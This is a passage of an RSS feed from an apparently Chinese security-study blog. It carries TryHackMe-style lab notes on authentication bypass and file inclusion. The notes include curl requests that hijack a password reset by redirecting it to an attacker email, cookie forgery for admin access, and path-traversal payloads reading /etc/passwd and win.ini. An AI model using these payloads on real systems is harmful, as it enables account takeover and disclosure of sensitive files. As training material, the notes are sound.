&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;:undolist&lt;/code&gt;&lt;/strong&gt;：显示所有可撤销的修改点（版本号和编号）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;:changes&lt;/code&gt;&lt;/strong&gt;：显示最近的修改列表（结合 &lt;code&gt;g;&lt;/code&gt; 和 &lt;code&gt;g,&lt;/code&gt; 跳转）。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h4 id=&#34;常见问题&#34;&gt;常见问题
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;误操作后无法撤销&lt;/strong&gt;：确保未执行保存（&lt;code&gt;:w&lt;/code&gt;）或外部命令打断了撤销链。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;撤销粒度问题&lt;/strong&gt;：Vim 将一次连续操作视为一个撤销单位（例如插入模式中的输入视为一次操作）。&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>身份验证绕过</title>
        <link>https://Yerucrem.github.io/p/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/</link>
        <pubDate>Wed, 19 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/</guid>
        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/4e4cc31a34179ac0e517d1c37a2925a57eb72a8878519af127e313034f388b04.png" alt="Featured image of post 身份验证绕过" /&gt;&lt;h1 id=&#34;身份验证绕过&#34;&gt;身份验证绕过
&lt;/h1&gt;&lt;h2 id=&#34;用户名枚举&#34;&gt;用户名枚举
&lt;/h2&gt;&lt;h2 id=&#34;暴力&#34;&gt;暴力
&lt;/h2&gt;&lt;h2 id=&#34;逻辑缺陷&#34;&gt;逻辑缺陷
&lt;/h2&gt;&lt;h3 id=&#34;什么是逻辑缺陷&#34;&gt;什么是逻辑缺陷？
&lt;/h3&gt;&lt;p&gt;有时身份验证过程包含逻辑缺陷。逻辑缺陷是指应用程序的典型逻辑路径被黑客绕过、规避或纵。逻辑缺陷可以存在于网站的任何区域，但在这种情况下，我们将专注于与身份验证相关的示例。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250319103332643.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;逻辑缺陷示例&#34;&gt;逻辑缺陷示例
&lt;/h3&gt;&lt;p&gt;下面的模拟代码示例检查客户端正在访问的路径的开头是否以 /admin 开头，如果是，则进行进一步检查以查看客户端是否实际上是 admin。如果页面不以 /admin 开头，则会向客户端显示该页面。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;if( url.substr(0,6) === &amp;#39;/admin&amp;#39;) {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    # Code to check user is an admin
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;} else {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    # View Page
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;因为上面的 PHP 代码示例使用了三个等号 （===），所以它正在查找字符串的完全匹配项，包括相同的字母大小写。该代码存在逻辑缺陷，因为请求 &lt;strong&gt;/adMin&lt;/strong&gt; 的未经身份验证的用户将不会检查其权限，而是向他们显示页面，从而完全绕过身份验证检查。&lt;/p&gt;
&lt;h3 id=&#34;逻辑缺陷实用&#34;&gt;逻辑缺陷实用
&lt;/h3&gt;&lt;p&gt;我们将检查 Acme IT 支持网站 （http：//MACHINE_IP/customers/reset） 的重置密码 功能。我们看到一个表单，要求提供与我们希望执行密码重置的账户关联的电子邮件地址。如果输入的电子邮件无效，您将收到错误消息&lt;strong&gt;Account not found from provided email address&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;出于演示目的，我们将使用 email address &lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;mailto:robert@acmeitsupport.thm&#34; &gt;robert@acmeitsupport.thm&lt;/a&gt;&lt;/strong&gt;被接受。然后，我们会看到表单的下一阶段，该阶段要求提供与此登录电子邮件地址关联的用户名。如果我们输入 robert 作为用户名并按下 Check Username 按钮，您将看到一条确认消息，告知将向 &lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;mailto:robert@acmeitsupport.thm&#34; &gt;robert@acmeitsupport.thm&lt;/a&gt;&lt;/strong&gt;发送一封密码重置电子邮件。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250319105628978.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;在此阶段，您可能想知道此应用程序中的漏洞可能是什么，因为您必须知道电子邮件和用户名，然后将密码链接发送到帐户所有者的电子邮件地址。&lt;/p&gt;
&lt;p&gt;在重置电子邮件过程的第二步中，用户名在 POST 字段中提交到 Web 服务器，电子邮件地址在查询字符串请求中作为 GET 字段发送。&lt;/p&gt;
&lt;p&gt;让我们通过使用 curl 工具手动向 Web 服务器发出请求来说明这一点。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@tryhackme$ curl &amp;#39;http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm&amp;#39; -H &amp;#39;Content-Type: application/x-www-form-urlencoded&amp;#39; -d &amp;#39;username=robert&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;我们使用该标志向请求添加额外的标头。在这种情况下，我们将 设置为 ，这让 Web 服务器知道我们正在发送表单数据，以便它正确理解我们的请求。&lt;/p&gt;
&lt;p&gt;在应用程序中，使用查询字符串检索用户帐户，但稍后，在应用程序逻辑中，使用 PHP 变量 &lt;code&gt;$_REQUEST&lt;/code&gt; 中的数据发送密码重置电子邮件。&lt;/p&gt;
&lt;p&gt;PHP&lt;code&gt;$_REQUEST&lt;/code&gt; 变量是一个数组，其中包含从查询字符串接收的数据和 POST 数据。如果查询字符串和 POST 数据使用相同的键名称，则此变量的应用程序逻辑优先使用 POST 数据字段而不是查询字符串，因此，如果我们向 POST 表单添加另一个参数，我们可以控制密码重置电子邮件的发送位置。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@tryhackme$ curl &amp;#39;http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm&amp;#39; -H &amp;#39;Content-Type: application/x-www-form-urlencoded&amp;#39; -d &amp;#39;username=robert&amp;amp;email=attacker@hacker.com&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250319110039108.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;**下一步，您需要在 Acme IT 支持客户部分创建一个帐户，这样做会为您提供一个可用于创建支持票证的唯一电子邮件地址。电子邮件地址的格式为 &lt;code&gt;{username}&lt;/code&gt;@customer.acmeitsupport.thm&lt;/p&gt;
&lt;p&gt;现在重新运行 &lt;strong&gt;Curl 请求 2&lt;/strong&gt;，但使用您的 @acmeitsupport。thm 在电子邮件字段中，您将在您的帐户上创建一个票证，其中包含一个链接，用于以 Robert 身份登录。使用 Robert 的帐户，您可以查看他们的支持票证并显示标志。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@tryhackme:~$ curl &amp;#39;http://MACHINE_IP/customers/reset?email=robert@acmeitsupport.thm&amp;#39; -H &amp;#39;Content-Type: application/x-www-form-urlencoded&amp;#39; -d &amp;#39;username=robert&amp;amp;email={username}@customer.acmeitsupport.thm&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;cookie-篡改&#34;&gt;Cookie 篡改
&lt;/h2&gt;&lt;p&gt;在联机会话期间检查和编辑 Web 服务器设置的 Cookie 可能会产生多种结果，例如未经身份验证的访问、访问其他用户帐户或提升的权限。&lt;/p&gt;
&lt;h3 id=&#34;纯文本&#34;&gt;&lt;strong&gt;纯文本&lt;/strong&gt;
&lt;/h3&gt;&lt;p&gt;某些 cookie 的内容可以是纯文本形式，并且它们的作用很明显。例如，如果这些是成功登录后设置的 Cookie：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Set-Cookie: logged_in=true; Max-Age=3600; Path=/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Set-Cookie: admin=false; Max-Age=3600; Path=/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;我们看到一个 Cookie （logged_in），它似乎用于控制用户当前是否登录，以及另一个 （admin），它控制访客是否具有管理员权限。使用这个逻辑，如果我们要更改 cookie 的内容并发出请求，我们将能够更改我们的权限。&lt;/p&gt;
&lt;p&gt;首先，我们先请求目标页面：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@tryhackme$ curl http://MACHINE_IP/cookie-test
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;我们可以看到我们返回了一条消息：&lt;strong&gt;Not Logged In&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;现在，我们将发送另一个请求，其中 logged_in Cookie 设置为 true，管理 Cookie 设置为 false：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@tryhackme$ curl -H &amp;#34;Cookie: logged_in=true; admin=false&amp;#34; http://MACHINE_IP/cookie-test
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;我们收到消息：&lt;strong&gt;Logged In As A User&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;最后，我们将发送最后一个请求，将 logged_in 和 admin Cookie 都设置为 true：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@tryhackme$ curl -H &amp;#34;Cookie: logged_in=true; admin=true&amp;#34; http://MACHINE_IP/cookie-test
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;这将返回结果：&lt;strong&gt;Logged In As An Admin&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;hashing-散列法&#34;&gt;Hashing &lt;strong&gt;散列法&lt;/strong&gt;
&lt;/h3&gt;&lt;p&gt;有时 Cookie 值看起来像一长串随机字符;这些称为哈希，它是原始文本的不可逆表示。以下是您可能会遇到的一些示例：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;strong&gt;原始字符串&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;** 哈希方法**&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;输出&lt;/strong&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;1&lt;/td&gt;
          &lt;td&gt;md5&lt;/td&gt;
          &lt;td&gt;c4ca4238a0b923820dcc509a6f75849b&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;1&lt;/td&gt;
          &lt;td&gt;sha-256&lt;/td&gt;
          &lt;td&gt;6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;1&lt;/td&gt;
          &lt;td&gt;sha-512&lt;/td&gt;
          &lt;td&gt;4dff4ea340f0a823f15d3f4f01ab62eae0e5da579ccb851f8db9dfe84c58b2b37b89903a740e1ee172da793a6e79d560e5f7f9bd058a12a280433ed6fa46510a&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;1&lt;/td&gt;
          &lt;td&gt;sha1&lt;/td&gt;
          &lt;td&gt;356a192b7913b04c54574d18c28d46e6395428ab&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;从上表中可以看出，同一输入字符串的哈希输出可能会因使用的哈希方法而显著不同。即使哈希是不可逆的，但每次都会产生相同的输出，这对我们很有帮助，因为 &lt;a class=&#34;link&#34; href=&#34;https://crackstation.net/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://crackstation.net/&lt;/a&gt; 等服务会保留数十亿个哈希及其原始字符串的数据库。&lt;/p&gt;
&lt;h3 id=&#34;编码&#34;&gt;&lt;strong&gt;编码&lt;/strong&gt;
&lt;/h3&gt;&lt;p&gt;编码类似于哈希，因为它会创建看似随机的文本字符串，但实际上，编码是可逆的。所以这就引出了一个问题，编码的意义何在？编码使我们能够将二进制数据转换为人类可读的文本，这些文本可以通过仅支持纯文本 ASCII 字符的介质轻松安全地传输。&lt;/p&gt;
&lt;p&gt;常见的编码类型包括 base32 和 base64，前者将二进制数据转换为字符 A-Z 和 2-7，后者使用字符 a-z、A-Z、0-9、+ 和 equals 符号进行转换进行填充。&lt;/p&gt;
&lt;p&gt;以以下数据为例，该数据由 Web 服务器在登录时设置：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;这个字符串 base64 解码的值为 &lt;strong&gt;{“id”：1，“admin”： false}&lt;/strong&gt; ，然后我们可以再次将其编码回 base64 编码，但将 admin 值设置为 true，这现在为我们提供了管理员访问权限。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>文件包含基础</title>
        <link>https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/</link>
        <pubDate>Wed, 19 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/</guid>
        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/638445f84229dc4814eb81dfe06baeb837e3a5e8920ec39035d8dd6e02c0a10d.png" alt="Featured image of post 文件包含基础" /&gt;&lt;h1 id=&#34;文件包含基础&#34;&gt;文件包含基础
&lt;/h1&gt;&lt;h2 id=&#34;介绍&#34;&gt;介绍
&lt;/h2&gt;&lt;p&gt;此房间旨在为您提供利用文件包含漏洞的基本知识，包括本地文件包含 （LFI）、远程文件包含 （RFI） 和目录遍历。此外，我们还将讨论发现这些漏洞的风险以及所需的补救措施。我们提供了每个漏洞的一些实际示例以及实践挑战。&lt;/p&gt;
&lt;p&gt;在某些情况下，编写 Web 应用程序是为了通过参数请求访问给定系统上的文件，包括图像、静态文本等。参数是附加到 URL 的查询参数字符串，可用于检索数据或根据用户输入执行作。 下图分解了 URL 的基本部分。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250319135235271.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;例如，参数用于 Google 搜索，其中 GET 请求将用户输入传递到搜索引擎中。 &lt;a class=&#34;link&#34; href=&#34;https://www.google.com/search?q=TryHackMe&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.google.com/search?q=TryHackMe&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;让我们讨论一个用户请求从 Web 服务器访问文件的场景。首先，用户向 Web 服务器发送一个 HTTP 请求，其中包含要显示的文件。例如，如果用户想要在 Web 应用程序中访问和显示其 CV，则请求可能如下所示，http://webapp.thm/get.php?file=userCV.pdf，其中 file 是参数，userCV.pdf是要访问的必需文件。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250319135313594.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;为什么会出现文件包含漏洞&#34;&gt;为什么会出现文件包含漏洞？
&lt;/h3&gt;&lt;p&gt;文件包含漏洞通常在 Web 应用程序（如 PHP ）的各种编程语言 中发现和利用，这些应用程序编写和实现都很糟糕。这些漏洞的主要问题是输入验证，其中用户输入没有经过清理或验证，由用户控制它们。当输入未经过验证时，用户可以将任何输入传递给函数，从而导致漏洞。&lt;/p&gt;
&lt;h3 id=&#34;文件包含有什么风险&#34;&gt;文件包含有什么风险？
&lt;/h3&gt;&lt;p&gt;默认情况下，攻击者可以利用文件包含漏洞来泄露数据，例如代码、凭据或与 Web 应用程序或作系统相关的其他重要文件。此外，如果攻击者可以通过任何其他方式将文件写入服务器，则文件包含可能会协同使用以获得远程命令执行 （RCE）。&lt;/p&gt;
&lt;h2 id=&#34;路径遍历&#34;&gt;路径遍历
&lt;/h2&gt;&lt;p&gt;也称为目录遍历，允许攻击者读取作系统资源，例如运行应用程序的服务器上的本地文件。攻击者通过纵和滥用 Web 应用程序的 URL 来查找和访问存储在应用程序根目录之外的文件或目录，从而利用此漏洞。&lt;/p&gt;
&lt;p&gt;当用户的输入传递到 PHP 中的 file_get_contents 等函数时，会出现路径遍历漏洞。请务必注意，该函数并不是导致此漏洞的主要因素。通常，糟糕的输入验证或筛选是导致此漏洞的原因。在 PHP 中，您可以使用 file_get_contents 读取文件的内容。&lt;/p&gt;
&lt;p&gt;下图显示了 Web 应用程序如何在 &lt;code&gt;/var/www/app&lt;/code&gt; 中存储文件。满意的路径是用户请求 从定义的路径 &lt;code&gt;/var/www/app/CVs userCV.pdf&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250319135502038.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;我们 可以通过添加有效负载来测试 URL 参数，以查看 Web 应用程序的行为方式。路径遍历攻击，也称为点-点-斜杠攻击，利用双点将目录上移一步。 如果攻击者找到入口点，在本例中为 get.php?file=，那么攻击者可能会发送如下内容 &lt;a class=&#34;link&#34; href=&#34;http://webapp.thm/get.php?file=../../../../etc/passwd&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://webapp.thm/get.php?file=../../../../etc/passwd&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;假设没有输入验证，而不是访问 PDF 文件位于 /var/www/app/CVs 位置，则 Web 应用程序会从其他 目录，在本例中为 /etc/passwd。每个 &lt;code&gt;..&lt;/code&gt; 条目都会移动一个目录，直到到达根目录 &lt;code&gt;/&lt;/code&gt;。然后，它将目录更改为 /etc，然后从那里读取 passwd 文件。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250319135730518.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;因此，Web 应用程序将文件的内容发送回给用户。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250319135753945.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;同样，如果 Web 应用程序在 Windows 服务器上运行，攻击者需要提供 Windows 路径。例如，如果攻击者想要读取位于c:\boot.ini 中的 boot.ini 文件，则攻击者可以根据目标尝试以下作 作系统版本：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://webapp.thm/get.php?file=../../../../boot.ini 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;或
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://webapp.thm/get.php?file=../../../../windows/win.ini
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;与 Linux作系统相同的概念在这里适用，在这种作系统中，我们爬上目录直到它到达根目录，这通常是 .&lt;/p&gt;
&lt;p&gt;有时，开发人员会添加过滤器以限制仅访问某些文件或目录。以下是测试时可以使用的一些常见作系统文件。&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;位置&lt;/th&gt;
          &lt;th&gt;描述&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;/etc/issue&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;包含要在登录提示之前打印的消息或系统标识。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;/etc/profile&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;控制系统范围的默认变量，如导出变量、文件创建掩码 （umask）、终端类型、邮件消息，以指示新邮件何时到达&lt;/td&gt;
